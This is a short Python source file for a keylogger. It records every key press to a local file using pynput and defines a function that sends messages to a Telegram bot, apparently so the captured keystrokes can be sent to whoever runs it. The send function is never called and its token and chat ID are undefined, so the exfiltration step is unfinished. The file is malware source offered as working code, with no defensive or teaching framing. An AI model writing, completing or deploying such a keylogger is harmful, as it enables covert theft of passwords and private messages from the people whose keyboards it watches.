from pynput import keyboard
import requests


def OnPress(key) : # Define the function for handling key presses
    
# write the pressed key to a log file
    with open("Key_log.txt", 'a') as f :
        try : 
            f.write(key.char)
        except AttributeError: 
            f.write(f'[{key}]') # for special keys (shift, ctrl...)

def sendingkeys(message):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    payload = {"chat_id": chatID, "text": message}

    try:
        r = requests.post(url, data=payload)
        print("Status:", r.status_code)
        print("Response:", r.text)
    except Exception as e:
        print("Something went wrong:", e)
            
    
# Create the keyboard listener with `on_press` handler       
with keyboard.Listener (
    on_press = OnPress) as listener :
    listener.join()






